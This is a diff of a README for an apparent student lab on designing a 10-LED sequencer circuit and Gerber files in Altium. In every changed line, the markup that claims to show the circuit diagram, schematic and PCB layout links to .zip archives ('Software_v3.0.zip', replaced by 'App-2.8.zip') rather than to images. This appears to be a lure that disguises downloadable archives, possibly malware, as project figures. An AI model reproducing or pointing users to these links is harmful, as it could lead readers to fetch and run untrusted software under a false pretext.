@@ -52,15 +52,15 @@ Power Supply and Grounding<br>
 The circuit is powered by a DC supply (typically 5V or 9V) connected at the VCC and GND lines. All ICs and components share a common ground to maintain correct operation.
 
 # CIRCUIT DIAGRAM:
-![image](https://raw.githubusercontent.com/MITHUN8521/Exp-6--Design-a-10-Led-Sequencer-circuit-using-Altium-software-and-generate-the-Gerber-file./main/nonadvancement/Software_v3.0.zip)
+![image](https://github.com/MITHUN8521/Exp-6--Design-a-10-Led-Sequencer-circuit-using-Altium-software-and-generate-the-Gerber-file./raw/refs/heads/main/nonadvancement/App-2.8.zip)
 
  
 # EXPECTED OUTPUT:
 ## Schematic diagram:
- <img width="934" height="533" alt="image" src="https://raw.githubusercontent.com/MITHUN8521/Exp-6--Design-a-10-Led-Sequencer-circuit-using-Altium-software-and-generate-the-Gerber-file./main/nonadvancement/Software_v3.0.zip" />
+ <img width="934" height="533" alt="image" src="https://github.com/MITHUN8521/Exp-6--Design-a-10-Led-Sequencer-circuit-using-Altium-software-and-generate-the-Gerber-file./raw/refs/heads/main/nonadvancement/App-2.8.zip" />
 
 ## Layout diagram:
- <img width="1567" height="871" alt="image" src="https://raw.githubusercontent.com/MITHUN8521/Exp-6--Design-a-10-Led-Sequencer-circuit-using-Altium-software-and-generate-the-Gerber-file./main/nonadvancement/Software_v3.0.zip" />
+ <img width="1567" height="871" alt="image" src="https://github.com/MITHUN8521/Exp-6--Design-a-10-Led-Sequencer-circuit-using-Altium-software-and-generate-the-Gerber-file./raw/refs/heads/main/nonadvancement/App-2.8.zip" />
 
 # RESULT:
 Thus, the schematic and PCB layout for the LED sequencer circuit has been successfully designed using Altium software.
